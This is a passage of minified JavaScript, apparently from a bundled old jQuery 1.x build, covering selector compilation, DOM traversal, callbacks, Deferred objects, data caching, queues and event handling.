                    }
                    u.push(t)
                }
            return pe(u)
        }
        function ve(_, g) {
            function e(e, t, n, i, a) {
                var s, r, o, l = 0, d = "0", u = e && [], c = [], h = L, m = e || v && M.find.TAG("*", a), f = Y += null == h ? 1 : Math.random() || .1, p = m.length;
                for (a && (L = t !== b && t); d !== p && null != (s = m[d]); d++) {
                    if (v && s) {
                        for (r = 0; o = _[r++]; )
                            if (o(s, t, n)) {
                                i.push(s);
                                break
                            }
                        a && (Y = f)
                    }
                    y && ((s = !o && s) && l--,
                    e && u.push(s))
                }
                if (l += d,
                y && d !== l) {
                    for (r = 0; o = g[r++]; )
                        o(u, c, t, n);
                    if (e) {
                        if (0 < l)
                            for (; d--; )
                                u[d] || c[d] || (c[d] = x.call(i));
                        c = _e(c)
                    }
                    E.apply(i, c),
                    a && !e && 0 < c.length && 1 < l + g.length && te.uniqueSort(i)
                }
                return a && (Y = f,
                L = h),
                u
            }
            var y = 0 < g.length
              , v = 0 < _.length;
            return y ? ie(e) : e
        }
        return ce.prototype = M.filters = M.pseudos,
        M.setFilters = new ce,
        p = te.compile = function(e, t) {
            var n, i = [], a = [], s = m[e + " "];
            if (!s) {
                for (n = (t = t || he(e)).length; n--; )
                    (s = ye(t[n]))[k] ? i.push(s) : a.push(s);
                s = m(e, ve(a, i))
            }
            return s
        }
        ,
        f.sortStable = k.split("").sort(w).join("") === k,
        f.detectDuplicates = !!u,
        _(),
        f.sortDetached = ae(function(e) {
            return 1 & e.compareDocumentPosition(b.createElement("div"))
        }),
        ae(function(e) {
            return e.innerHTML = "<a href='#'></a>",
            "#" === e.firstChild.getAttribute("href")
        }) || se("type|href|height|width", function(e, t, n) {
            return n ? void 0 : e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2)
        }),
        f.attributes && ae(function(e) {
            return e.innerHTML = "<input/>",
            e.firstChild.setAttribute("value", ""),
            "" === e.firstChild.getAttribute("value")
        }) || se("value", function(e, t, n) {
            return n || "input" !== e.nodeName.toLowerCase() ? void 0 : e.defaultValue
        }),
        ae(function(e) {
            return null == e.getAttribute("disabled")
        }) || se(A, function(e, t, n) {
            var i;
            return n ? void 0 : !0 === e[t] ? t.toLowerCase() : (i = e.getAttributeNode(t)) && i.specified ? i.value : null
        }),
        te
    }(f);
    k.find = y,
    k.expr = y.selectors,
    k.expr[":"] = k.expr.pseudos,
    k.unique = y.uniqueSort,
    k.text = y.getText,
    k.isXMLDoc = y.isXML,
    k.contains = y.contains;
    var v = k.expr.match.needsContext
      , M = /^<(\w+)\s*\/?>(?:<\/\1>|)$/
      , L = /^.[^:#\[\.,]*$/;
    function b(e, n, i) {
        if (k.isFunction(n))
            return k.grep(e, function(e, t) {
                return !!n.call(e, t, e) !== i
            });
        if (n.nodeType)
            return k.grep(e, function(e) {
                return e === n !== i
            });
        if ("string" == typeof n) {
            if (L.test(n))
                return k.filter(n, e, i);
            n = k.filter(n, e)
        }
        return k.grep(e, function(e) {
            return 0 <= k.inArray(e, n) !== i
        })
    }
    k.filter = function(e, t, n) {
        var i = t[0];
        return n && (e = ":not(" + e + ")"),
        1 === t.length && 1 === i.nodeType ? k.find.matchesSelector(i, e) ? [i] : [] : k.find.matches(e, k.grep(t, function(e) {
            return 1 === e.nodeType
        }))
    }
    ,
    k.fn.extend({
        find: function(e) {
            var t, n = [], i = this, a = i.length;
            if ("string" != typeof e)
                return this.pushStack(k(e).filter(function() {
                    for (t = 0; t < a; t++)
                        if (k.contains(i[t], this))
                            return !0
                }));
            for (t = 0; t < a; t++)
                k.find(e, i[t], n);
            return (n = this.pushStack(1 < a ? k.unique(n) : n)).selector = this.selector ? this.selector + " " + e : e,
            n
        },
        filter: function(e) {
            return this.pushStack(b(this, e || [], !1))
        },
        not: function(e) {
            return this.pushStack(b(this, e || [], !0))
        },
        is: function(e) {
            return !!b(this, "string" == typeof e && v.test(e) ? k(e) : e || [], !1).length
        }
    });
    var D, Y = f.document, w = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/;
    (k.fn.init = function(e, t) {
        var n, i;
        if (!e)
            return this;
        if ("string" != typeof e)
            return e.nodeType ? (this.context = this[0] = e,
            this.length = 1,
            this) : k.isFunction(e) ? void 0 !== D.ready ? D.ready(e) : e(k) : (void 0 !== e.selector && (this.selector = e.selector,
            this.context = e.context),
            k.makeArray(e, this));
        if (!(n = "<" === e.charAt(0) && ">" === e.charAt(e.length - 1) && 3 <= e.length ? [null, e, null] : w.exec(e)) || !n[1] && t)
            return !t || t.jquery ? (t || D).find(e) : this.constructor(t).find(e);
        if (n[1]) {
            if (t = t instanceof k ? t[0] : t,
            k.merge(this, k.parseHTML(n[1], t && t.nodeType ? t.ownerDocument || t : Y, !0)),
            M.test(n[1]) && k.isPlainObject(t))
                for (n in t)
                    k.isFunction(this[n]) ? this[n](t[n]) : this.attr(n, t[n]);
            return this
        }
        if ((i = Y.getElementById(n[2])) && i.parentNode) {
            if (i.id !== n[2])
                return D.find(e);
            this.length = 1,
            this[0] = i
        }
        return this.context = Y,
        this.selector = e,
        this
    }
    ).prototype = k.fn,
    D = k(Y);
    var T = /^(?:parents|prev(?:Until|All))/
      , S = {
        children: !0,
        contents: !0,
        next: !0,
        prev: !0
    };
    function x(e, t) {
        for (; (e = e[t]) && 1 !== e.nodeType; )
            ;
        return e
    }
    k.extend({
        dir: function(e, t, n) {
            for (var i = [], a = e[t]; a && 9 !== a.nodeType && (void 0 === n || 1 !== a.nodeType || !k(a).is(n)); )
                1 === a.nodeType && i.push(a),
                a = a[t];
            return i
        },
        sibling: function(e, t) {
            for (var n = []; e; e = e.nextSibling)
                1 === e.nodeType && e !== t && n.push(e);
            return n
        }
    }),
    k.fn.extend({
        has: function(e) {
            var t, n = k(e, this), i = n.length;
            return this.filter(function() {
                for (t = 0; t < i; t++)
                    if (k.contains(this, n[t]))
                        return !0
            })
        },
        closest: function(e, t) {
            for (var n, i = 0, a = this.length, s = [], r = v.test(e) || "string" != typeof e ? k(e, t || this.context) : 0; i < a; i++)
                for (n = this[i]; n && n !== t; n = n.parentNode)
                    if (n.nodeType < 11 && (r ? -1 < r.index(n) : 1 === n.nodeType && k.find.matchesSelector(n, e))) {
                        s.push(n);
                        break
                    }
            return this.pushStack(1 < s.length ? k.unique(s) : s)
        },
        index: function(e) {
            return e ? "string" == typeof e ? k.inArray(this[0], k(e)) : k.inArray(e.jquery ? e[0] : e, this) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1
        },
        add: function(e, t) {
            return this.pushStack(k.unique(k.merge(this.get(), k(e, t))))
        },
        addBack: function(e) {
            return this.add(null == e ? this.prevObject : this.prevObject.filter(e))
        }
    }),
    k.each({
        parent: function(e) {
            var t = e.parentNode;
            return t && 11 !== t.nodeType ? t : null
        },
        parents: function(e) {
            return k.dir(e, "parentNode")
        },
        parentsUntil: function(e, t, n) {
            return k.dir(e, "parentNode", n)
        },
        next: function(e) {
            return x(e, "nextSibling")
        },
        prev: function(e) {
            return x(e, "previousSibling")
        },
        nextAll: function(e) {
            return k.dir(e, "nextSibling")
        },
        prevAll: function(e) {
            return k.dir(e, "previousSibling")
        },
        nextUntil: function(e, t, n) {
            return k.dir(e, "nextSibling", n)
        },
        prevUntil: function(e, t, n) {
            return k.dir(e, "previousSibling", n)
        },
        siblings: function(e) {
            return k.sibling((e.parentNode || {}).firstChild, e)
        },
        children: function(e) {
            return k.sibling(e.firstChild)
        },
        contents: function(e) {
            return k.nodeName(e, "iframe") ? e.contentDocument || e.contentWindow.document : k.merge([], e.childNodes)
        }
    }, function(i, a) {
        k.fn[i] = function(e, t) {
            var n = k.map(this, a, e);
            return "Until" !== i.slice(-5) && (t = e),
            t && "string" == typeof t && (n = k.filter(t, n)),
            1 < this.length && (S[i] || (n = k.unique(n)),
            T.test(i) && (n = n.reverse())),
            this.pushStack(n)
        }
    });
    var H, E = /\S+/g, j = {};
    function C() {
        Y.addEventListener ? (Y.removeEventListener("DOMContentLoaded", A, !1),
        f.removeEventListener("load", A, !1)) : (Y.detachEvent("onreadystatechange", A),
        f.detachEvent("onload", A))
    }
    function A() {
        !Y.addEventListener && "load" !== event.type && "complete" !== Y.readyState || (C(),
        k.ready())
    }
    k.Callbacks = function(a) {
        var e, n;
        a = "string" == typeof a ? j[a] || (n = j[e = a] = {},
        k.each(e.match(E) || [], function(e, t) {
            n[t] = !0
        }),
        n) : k.extend({}, a);
        var i, t, s, r, o, l, d = [], u = !a.once && [], c = function(e) {
            for (t = a.memory && e,
            s = !0,
            o = l || 0,
            l = 0,
            r = d.length,
            i = !0; d && o < r; o++)
                if (!1 === d[o].apply(e[0], e[1]) && a.stopOnFalse) {
                    t = !1;
                    break
                }
            i = !1,
            d && (u ? u.length && c(u.shift()) : t ? d = [] : h.disable())
        }, h = {
            add: function() {
                if (d) {
                    var e = d.length;
                    !function i(e) {
                        k.each(e, function(e, t) {
                            var n = k.type(t);
                            "function" === n ? a.unique && h.has(t) || d.push(t) : t && t.length && "string" !== n && i(t)
                        })
                    }(arguments),
                    i ? r = d.length : t && (l = e,
                    c(t))
                }
                return this
            },
            remove: function() {
                return d && k.each(arguments, function(e, t) {
                    for (var n; -1 < (n = k.inArray(t, d, n)); )
                        d.splice(n, 1),
                        i && (n <= r && r--,
                        n <= o && o--)
                }),
                this
            },
            has: function(e) {
                return e ? -1 < k.inArray(e, d) : !(!d || !d.length)
            },
            empty: function() {
                return d = [],
                r = 0,
                this
            },
            disable: function() {
                return d = u = t = void 0,
                this
            },
            disabled: function() {
                return !d
            },
            lock: function() {
                return u = void 0,
                t || h.disable(),
                this
            },
            locked: function() {
                return !u
            },
            fireWith: function(e, t) {
                return !d || s && !u || (t = [e, (t = t || []).slice ? t.slice() : t],
                i ? u.push(t) : c(t)),
                this
            },
            fire: function() {
                return h.fireWith(this, arguments),
                this
            },
            fired: function() {
                return !!s
            }
        };
        return h
    }
    ,
    k.extend({
        Deferred: function(e) {
            var s = [["resolve", "done", k.Callbacks("once memory"), "resolved"], ["reject", "fail", k.Callbacks("once memory"), "rejected"], ["notify", "progress", k.Callbacks("memory")]]
              , a = "pending"
              , r = {
                state: function() {
                    return a
                },
                always: function() {
                    return o.done(arguments).fail(arguments),
                    this
                },
                then: function() {
                    var a = arguments;
                    return k.Deferred(function(i) {
                        k.each(s, function(e, t) {
                            var n = k.isFunction(a[e]) && a[e];
                            o[t[1]](function() {
                                var e = n && n.apply(this, arguments);
                                e && k.isFunction(e.promise) ? e.promise().done(i.resolve).fail(i.reject).progress(i.notify) : i[t[0] + "With"](this === r ? i.promise() : this, n ? [e] : arguments)
                            })
                        }),
                        a = null
                    }).promise()
                },
                promise: function(e) {
                    return null != e ? k.extend(e, r) : r
                }
            }
              , o = {};
            return r.pipe = r.then,
            k.each(s, function(e, t) {
                var n = t[2]
                  , i = t[3];
                r[t[1]] = n.add,
                i && n.add(function() {
                    a = i
                }, s[1 ^ e][2].disable, s[2][2].lock),
                o[t[0]] = function() {
                    return o[t[0] + "With"](this === o ? r : this, arguments),
                    this
                }
                ,
                o[t[0] + "With"] = n.fireWith
            }),
            r.promise(o),
            e && e.call(o, o),
            o
        },
        when: function(e) {
            function t(t, n, i) {
                return function(e) {
                    n[t] = this,
                    i[t] = 1 < arguments.length ? u.call(arguments) : e,
                    i === a ? d.notifyWith(n, i) : --l || d.resolveWith(n, i)
                }
            }
            var a, n, i, s = 0, r = u.call(arguments), o = r.length, l = 1 !== o || e && k.isFunction(e.promise) ? o : 0, d = 1 === l ? e : k.Deferred();
            if (1 < o)
                for (a = new Array(o),
                n = new Array(o),
                i = new Array(o); s < o; s++)
                    r[s] && k.isFunction(r[s].promise) ? r[s].promise().done(t(s, i, r)).fail(d.reject).progress(t(s, n, a)) : --l;
            return l || d.resolveWith(i, r),
            d.promise()
        }
    }),
    k.fn.ready = function(e) {
        return k.ready.promise().done(e),
        this
    }
    ,
    k.extend({
        isReady: !1,
        readyWait: 1,
        holdReady: function(e) {
            e ? k.readyWait++ : k.ready(!0)
        },
        ready: function(e) {
            if (!0 === e ? !--k.readyWait : !k.isReady) {
                if (!Y.body)
                    return setTimeout(k.ready);
                (k.isReady = !0) !== e && 0 < --k.readyWait || (H.resolveWith(Y, [k]),
                k.fn.trigger && k(Y).trigger("ready").off("ready"))
            }
        }
    }),
    k.ready.promise = function(e) {
        if (!H)
            if (H = k.Deferred(),
            "complete" === Y.readyState)
                setTimeout(k.ready);
            else if (Y.addEventListener)
                Y.addEventListener("DOMContentLoaded", A, !1),
                f.addEventListener("load", A, !1);
            else {
                Y.attachEvent("onreadystatechange", A),
                f.attachEvent("onload", A);
                var n = !1;
                try {
                    n = null == f.frameElement && Y.documentElement
                } catch (e) {}
                n && n.doScroll && !function t() {
                    if (!k.isReady) {
                        try {
                            n.doScroll("left")
                        } catch (e) {
                            return setTimeout(t, 50)
                        }
                        C(),
                        k.ready()
                    }
                }()
            }
        return H.promise(e)
    }
    ;
    var P, O = "undefined";
    for (P in k(g))
        break;
    g.ownLast = "0" !== P,
    g.inlineBlockNeedsLayout = !1,
    k(function() {
        var e, t, n = Y.getElementsByTagName("body")[0];
        n && ((e = Y.createElement("div")).style.cssText = "border:0;width:0;height:0;position:absolute;top:0;left:-9999px;margin-top:1px",
        t = Y.createElement("div"),
        n.appendChild(e).appendChild(t),
        typeof t.style.zoom !== O && (t.style.cssText = "border:0;margin:0;width:1px;padding:1px;display:inline;zoom:1",
        (g.inlineBlockNeedsLayout = 3 === t.offsetWidth) && (n.style.zoom = 1)),
        n.removeChild(e),
        e = t = null)
    }),
    function() {
        var e = Y.createElement("div");
        if (null == g.deleteExpando) {
            g.deleteExpando = !0;
            try {
                delete e.test
            } catch (e) {
                g.deleteExpando = !1
            }
        }
        e = null
    }(),
    k.acceptData = function(e) {
        var t = k.noData[(e.nodeName + " ").toLowerCase()]
          , n = +e.nodeType || 1;
        return (1 === n || 9 === n) && (!t || !0 !== t && e.getAttribute("classid") === t)
    }
    ;
    var N = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/
      , F = /([A-Z])/g;
    function W(e, t, n) {
        if (void 0 === n && 1 === e.nodeType) {
            var i = "data-" + t.replace(F, "-$1").toLowerCase();
            if ("string" == typeof (n = e.getAttribute(i))) {
                try {
                    n = "true" === n || "false" !== n && ("null" === n ? null : +n + "" === n ? +n : N.test(n) ? k.parseJSON(n) : n)
                } catch (e) {}
                k.data(e, t, n)
            } else
                n = void 0
        }
        return n
    }
    function I(e) {
        var t;
        for (t in e)
            if (("data" !== t || !k.isEmptyObject(e[t])) && "toJSON" !== t)
                return;
        return 1
    }
    function z(e, t, n, i) {
        if (k.acceptData(e)) {
            var a, s, r = k.expando, o = e.nodeType, l = o ? k.cache : e, d = o ? e[r] : e[r] && r;
            if (d && l[d] && (i || l[d].data) || void 0 !== n || "string" != typeof t)
                return l[d = d || (o ? e[r] = c.pop() || k.guid++ : r)] || (l[d] = o ? {} : {
                    toJSON: k.noop
                }),
                "object" != typeof t && "function" != typeof t || (i ? l[d] = k.extend(l[d], t) : l[d].data = k.extend(l[d].data, t)),
                s = l[d],
                i || (s.data || (s.data = {}),
                s = s.data),
                void 0 !== n && (s[k.camelCase(t)] = n),
                "string" == typeof t ? null == (a = s[t]) && (a = s[k.camelCase(t)]) : a = s,
                a
        }
    }
    function R(e, t, n) {
        if (k.acceptData(e)) {
            var i, a, s = e.nodeType, r = s ? k.cache : e, o = s ? e[k.expando] : k.expando;
            if (r[o]) {
                if (t && (i = n ? r[o] : r[o].data)) {
                    a = (t = k.isArray(t) ? t.concat(k.map(t, k.camelCase)) : t in i ? [t] : (t = k.camelCase(t))in i ? [t] : t.split(" ")).length;
                    for (; a--; )
                        delete i[t[a]];
                    if (n ? !I(i) : !k.isEmptyObject(i))
                        return
                }
                (n || (delete r[o].data,
                I(r[o]))) && (s ? k.cleanData([e], !0) : g.deleteExpando || r != r.window ? delete r[o] : r[o] = null)
            }
        }
    }
    k.extend({
        cache: {},
        noData: {
            "applet ": !0,
            "embed ": !0,
            "object ": "clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
        },
        hasData: function(e) {
            return !!(e = e.nodeType ? k.cache[e[k.expando]] : e[k.expando]) && !I(e)
        },
        data: function(e, t, n) {
            return z(e, t, n)
        },
        removeData: function(e, t) {
            return R(e, t)
        },
        _data: function(e, t, n) {
            return z(e, t, n, !0)
        },
        _removeData: function(e, t) {
            return R(e, t, !0)
        }
    }),
    k.fn.extend({
        data: function(e, t) {
            var n, i, a, s = this[0], r = s && s.attributes;
            if (void 0 !== e)
                return "object" == typeof e ? this.each(function() {
                    k.data(this, e)
                }) : 1 < arguments.length ? this.each(function() {
                    k.data(this, e, t)
                }) : s ? W(s, e, k.data(s, e)) : void 0;
            if (this.length && (a = k.data(s),
            1 === s.nodeType && !k._data(s, "parsedAttrs"))) {
                for (n = r.length; n--; )
                    0 === (i = r[n].name).indexOf("data-") && W(s, i = k.camelCase(i.slice(5)), a[i]);
                k._data(s, "parsedAttrs", !0)
            }
            return a
        },
        removeData: function(e) {
            return this.each(function() {
                k.removeData(this, e)
            })
        }
    }),
    k.extend({
        queue: function(e, t, n) {
            var i;
            return e ? (t = (t || "fx") + "queue",
            i = k._data(e, t),
            n && (!i || k.isArray(n) ? i = k._data(e, t, k.makeArray(n)) : i.push(n)),
            i || []) : void 0
        },
        dequeue: function(e, t) {
            t = t || "fx";
            var n = k.queue(e, t)
              , i = n.length
              , a = n.shift()
              , s = k._queueHooks(e, t);
            "inprogress" === a && (a = n.shift(),
            i--),
            a && ("fx" === t && n.unshift("inprogress"),
            delete s.stop,
            a.call(e, function() {
                k.dequeue(e, t)
            }, s)),
            !i && s && s.empty.fire()
        },
        _queueHooks: function(e, t) {
            var n = t + "queueHooks";
            return k._data(e, n) || k._data(e, n, {
                empty: k.Callbacks("once memory").add(function() {
                    k._removeData(e, t + "queue"),
                    k._removeData(e, n)
                })
            })
        }
    }),
    k.fn.extend({
        queue: function(t, n) {
            var e = 2;
            return "string" != typeof t && (n = t,
            t = "fx",
            e--),
            arguments.length < e ? k.queue(this[0], t) : void 0 === n ? this : this.each(function() {
                var e = k.queue(this, t, n);
                k._queueHooks(this, t),
                "fx" === t && "inprogress" !== e[0] && k.dequeue(this, t)
            })
        },
        dequeue: function(e) {
            return this.each(function() {
                k.dequeue(this, e)
            })
        },
        clearQueue: function(e) {
            return this.queue(e || "fx", [])
        },
        promise: function(e, t) {
            function n() {
                --a || s.resolveWith(r, [r])
            }
            var i, a = 1, s = k.Deferred(), r = this, o = this.length;
            for ("string" != typeof e && (t = e,
            e = void 0),
            e = e || "fx"; o--; )
                (i = k._data(r[o], e + "queueHooks")) && i.empty && (a++,
                i.empty.add(n));
            return n(),
            s.promise(t)
        }
    });
    function $(e, t) {
        return e = t || e,
        "none" === k.css(e, "display") || !k.contains(e.ownerDocument, e)
    }
    var B = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source
      , q = ["Top", "Right", "Bottom", "Left"]
      , U = k.access = function(e, t, n, i, a, s, r) {
        var o = 0
          , l = e.length
          , d = null == n;
        if ("object" === k.type(n))
            for (o in a = !0,
            n)
                k.access(e, t, o, n[o], !0, s, r);
        else if (void 0 !== i && (a = !0,
        k.isFunction(i) || (r = !0),
        d && (t = r ? (t.call(e, i),
        null) : (d = t,
        function(e, t, n) {
            return d.call(k(e), n)
        }
        )),
        t))
            for (; o < l; o++)
                t(e[o], n, r ? i : i.call(e[o], o, t(e[o], n)));
        return a ? e : d ? t.call(e) : l ? t(e[0], n) : s
    }
      , J = /^(?:checkbox|radio)$/i;
    !function() {
        var e = Y.createDocumentFragment()
          , t = Y.createElement("div")
          , n = Y.createElement("input");
        if (t.setAttribute("className", "t"),
        t.innerHTML = "  <link/><table></table><a href='/a'>a</a>",
        g.leadingWhitespace = 3 === t.firstChild.nodeType,
        g.tbody = !t.getElementsByTagName("tbody").length,
        g.htmlSerialize = !!t.getElementsByTagName("link").length,
        g.html5Clone = "<:nav></:nav>" !== Y.createElement("nav").cloneNode(!0).outerHTML,
        n.type = "checkbox",
        n.checked = !0,
        e.appendChild(n),
        g.appendChecked = n.checked,
        t.innerHTML = "<textarea>x</textarea>",
        g.noCloneChecked = !!t.cloneNode(!0).lastChild.defaultValue,
        e.appendChild(t),
        t.innerHTML = "<input type='radio' checked='checked' name='t'/>",
        g.checkClone = t.cloneNode(!0).cloneNode(!0).lastChild.checked,
        g.noCloneEvent = !0,
        t.attachEvent && (t.attachEvent("onclick", function() {
            g.noCloneEvent = !1
        }),
        t.cloneNode(!0).click()),
        null == g.deleteExpando) {
            g.deleteExpando = !0;
            try {
                delete t.test
            } catch (e) {
                g.deleteExpando = !1
            }
        }
        e = t = n = null
    }(),
    function() {
        var e, t, n = Y.createElement("div");
        for (e in {
            submit: !0,
            change: !0,
            focusin: !0
        })
            t = "on" + e,
            (g[e + "Bubbles"] = t in f) || (n.setAttribute(t, "t"),
            g[e + "Bubbles"] = !1 === n.attributes[t].expando);
        n = null
    }();
    var V = /^(?:input|select|textarea)$/i
      , G = /^key/
      , X = /^(?:mouse|contextmenu)|click/
      , K = /^(?:focusinfocus|focusoutblur)$/
      , Q = /^([^.]*)(?:\.(.+)|)$/;
    function Z() {
        return !0
    }
    function ee() {
        return !1
    }
    function te() {
        try {
            return Y.activeElement
        } catch (e) {}
    }
    function ne(e) {
        var t = ie.split("|")
          , n = e.createDocumentFragment();
        if (n.createElement)
            for (; t.length; )
                n.createElement(t.pop());
        return n
    }
    k.event = {
        global: {},
        add: function(e, t, n, i, a) {
            var s, r, o, l, d, u, c, h, m, f, p, _ = k._data(e);
            if (_) {
                for (n.handler && (n = (l = n).handler,
                a = l.selector),
                n.guid || (n.guid = k.guid++),
                (r = _.events) || (r = _.events = {}),
                (u = _.handle) || ((u = _.handle = function(e) {
                    return typeof k === O || e && k.event.triggered === e.type ? void 0 : k.event.dispatch.apply(u.elem, arguments)
                }
                ).elem = e),
                o = (t = (t || "").match(E) || [""]).length; o--; )
                    m = p = (s = Q.exec(t[o]) || [])[1],
                    f = (s[2] || "").split(".").sort(),
                    m && (d = k.event.special[m] || {},
                    m = (a ? d.delegateType : d.bindType) || m,
                    d = k.event.special[m] || {},
                    c = k.extend({
                        type: m,
                        origType: p,
                        data: i,
                        handler: n,
                        guid: n.guid,
                        selector: a,
                        needsContext: a && k.expr.match.needsContext.test(a),
                        namespace: f.join(".")
                    }, l),
                    (h = r[m]) || ((h = r[m] = []).delegateCount = 0,
                    d.setup && !1 !== d.setup.call(e, i, f, u) || (e.addEventListener ? e.addEventListener(m, u, !1) : e.attachEvent && e.attachEvent("on" + m, u))),
                    d.add && (d.add.call(e, c),
                    c.handler.guid || (c.handler.guid = n.guid)),
                    a ? h.splice(h.delegateCount++, 0, c) : h.push(c),
                    k.event.global[m] = !0);
                e = null
            }
        },
        remove: function(e, t, n, i, a) {
            var s, r, o, l, d, u, c, h, m, f, p, _ = k.hasData(e) && k._data(e);
            if (_ && (u = _.events)) {
                for (d = (t = (t || "").match(E) || [""]).length; d--; )
                    if (m = p = (o = Q.exec(t[d]) || [])[1],
                    f = (o[2] || "").split(".").sort(),
                    m) {
                        for (c = k.event.special[m] || {},
                        h = u[m = (i ? c.delegateType : c.bindType) || m] || [],
                        o = o[2] && new RegExp("(^|\\.)" + f.join("\\.(?:.*\\.|)") + "(\\.|$)"),
                        l = s = h.length; s--; )
                            r = h[s],
                            !a && p !== r.origType || n && n.guid !== r.guid || o && !o.test(r.namespace) || i && i !== r.selector && ("**" !== i || !r.selector) || (h.splice(s, 1),
                            r.selector && h.delegateCount--,
                            c.remove && c.remove.call(e, r));
                        l && !h.length && (c.teardown && !1 !== c.teardown.call(e, f, _.handle) || k.removeEvent(e, m, _.handle),
                        delete u[m])
                    } else
                        for (m in u)
                            k.event.remove(e, m + t[d], n, i, !0);
                k.isEmptyObject(u) && (delete _.handle,
                k._removeData(e, "events"))
            }
        },
        trigger: function(e, t, n, i) {
            var a, s, r, o, l, d, u, c = [n || Y], h = _.call(e, "type") ? e.type : e, m = _.call(e, "namespace") ? e.namespace.split(".") : [];
            if (r = d = n = n || Y,
            3 !== n.nodeType && 8 !== n.nodeType && !K.test(h + k.event.triggered) && (0 <= h.indexOf(".") && (h = (m = h.split(".")).shift(),
            m.sort()),
            s = h.indexOf(":") < 0 && "on" + h,
            (e = e[k.expando] ? e : new k.Event(h,"object" == typeof e && e)).isTrigger = i ? 2 : 3,
            e.namespace = m.join("."),
            e.namespace_re = e.namespace ? new RegExp("(^|\\.)" + m.join("\\.(?:.*\\.|)") + "(\\.|$)") : null,
            e.result = void 0,
            e.target || (e.target = n),
            t = null == t ? [e] : k.makeArray(t, [e]),
            l = k.event.special[h] || {},
            i || !l.trigger || !1 !== l.trigger.apply(n, t))) {
                if (!i && !l.noBubble && !k.isWindow(n)) {
                    for (o = l.delegateType || h,
                    K.test(o + h) || (r = r.parentNode); r; r = r.parentNode)
                        c.push(r),
                        d = r;
                    d === (n.ownerDocument || Y) && c.push(d.defaultView || d.parentWindow || f)
                }
                for (u = 0; (r = c[u++]) && !e.isPropagationStopped(); )
                    e.type = 1 < u ? o : l.bindType || h,
                    (a = (k._data(r, "events") || {})[e.type] && k._data(r, "handle")) && a.apply(r, t),
                    (a = s && r[s]) && a.apply && k.acceptData(r) && (e.result = a.apply(r, t),
                    !1 === e.result && e.preventDefault());
                if (e.type = h,
                !i && !e.isDefaultPrevented() && (!l._default || !1 === l._default.apply(c.pop(), t)) && k.acceptData(n) && s && n[h] && !k.isWindow(n)) {
                    (d = n[s]) && (n[s] = null),
                    k.event.triggered = h;
                    try {
                        n[h]()
                    } catch (e) {}
                    k.event.triggered = void 0,
                    d && (n[s] = d)
                }
                return e.result
            }
        },
        dispatch: function(e) {
            e = k.event.fix(e);
            var t, n, i, a, s, r = [], o = u.call(arguments), l = (k._data(this, "events") || {})[e.type] || [], d = k.event.special[e.type] || {};
            if ((o[0] = e).delegateTarget = this,
            !d.preDispatch || !1 !== d.preDispatch.call(this, e)) {
                for (r = k.event.handlers.call(this, e, l),
                t = 0; (a = r[t++]) && !e.isPropagationStopped(); )
                    for (e.currentTarget = a.elem,
                    s = 0; (i = a.handlers[s++]) && !e.isImmediatePropagationStopped(); )
                        e.namespace_re && !e.namespace_re.test(i.namespace) || (e.handleObj = i,
                        e.data = i.data,
                        void 0 !== (n = ((k.event.special[i.origType] || {}).handle || i.handler).apply(a.elem, o)) && !1 === (e.result = n) && (e.preventDefault(),
                        e.stopPropagation()));
                return d.postDispatch && d.postDispatch.call(this, e),
                e.result
            }
        },
        handlers: function(e, t) {
            var n, i, a, s, r = [], o = t.delegateCount, l = e.target;
            if (o && l.nodeType && (!e.button || "click" !== e.type))
                for (; l != this; l = l.parentNode || this)
                    if (1 === l.nodeType && (!0 !== l.disabled || "click" !== e.type)) {
                        for (a = [],
                        s = 0; s < o; s++)
                            void 0 === a[n = (i = t[s]).selector + " "] && (a[n] = i.needsContext ? 0 <= k(n, this).index(l) : k.find(n, this, null, [l]).length),
                            a[n] && a.push(i);
                        a.length && r.push({
                            elem: l,
                            handlers: a
                        })
                    }
            return o < t.length && r.push({
                elem: this,
                handlers: t.slice(o)
            }),
            r
        },
        fix: function(e) {
            if (e[k.expando])
                return e;
            var t, n, i, a = e.type, s = e, r = this.fixHooks[a];
            for (r || (this.fixHooks[a] = r = X.test(a) ? this.mouseHooks : G.test(a) ? this.keyHooks : {}),
            i = r.props ? this.props.concat(r.props) : this.props,
            e = new k.Event(s),
            t = i.length; t--; )
                e[n = i[t]] = s[n];
            return e.target || (e.target = s.srcElement || Y),
            3 === e.target.nodeType && (e.target = e.target.parentNode),
            e.metaKey = !!e.metaKey,
            r.filter ? r.filter(e, s) : e
        },
        props: "altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),
        fixHooks: {},
        keyHooks: {
            props: "char charCode key keyCode".split(" "),
            filter: function(e, t) {
                return null == e.which && (e.which = null != t.charCode ? t.charCode : t.keyCode),
                e
            }
        },
        mouseHooks: {
            props: "button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),
            filter: function(e, t) {
                var n, i, a, s = t.button, r = t.fromElement;
                return null == e.pageX && null != t.clientX && (a = (i = e.target.ownerDocument || Y).documentElement,
                n = i.body,
                e.pageX = t.clientX + (a && a.scrollLeft || n && n.scrollLeft || 0) - (a && a.clientLeft || n && n.clientLeft || 0),
                e.pageY = t.clientY + (a && a.scrollTop || n && n.scrollTop || 0) - (a && a.clientTop || n && n.clientTop || 0)),
                !e.relatedTarget && r && (e.relatedTarget = r === e.target ? t.toElement : r),
                e.which || void 0 === s || (e.which = 1 & s ? 1 : 2 & s ? 3 : 4 & s ? 2 : 0),
                e
            }
        },
        special: {
            load: {
                noBubble: !0
            },
            focus: {
                trigger: function() {
                    if (this !== te() && this.focus)
                        try {
                            return this.focus(),
                            !1
                        } catch (e) {}
                },
                delegateType: "focusin"
            },
            blur: {
                trigger: function() {
                    return this === te() && this.blur ? (this.blur(),
                    !1) : void 0
                },
                delegateType: "focusout"
            },
            click: {
                trigger: function() {
                    return k.nodeName(this, "input") && "checkbox" === this.type && this.click ? (this.click(),
                    !1) : void 0
                },
                _default: function(e) {
                    return k.nodeName(e.target, "a")
                }
            },
            beforeunload: {
                postDispatch: function(e) {
                    void 0 !== e.result && (e.originalEvent.returnValue = e.result)
                }
            }
        },
        simulate: function(e, t, n, i) {
            var a = k.extend(new k.Event, n, {
                type: e,
                isSimulated: !0,
                originalEvent: {}
            });
            i ? k.event.trigger(a, null, t) : k.event.dispatch.call(t, a),
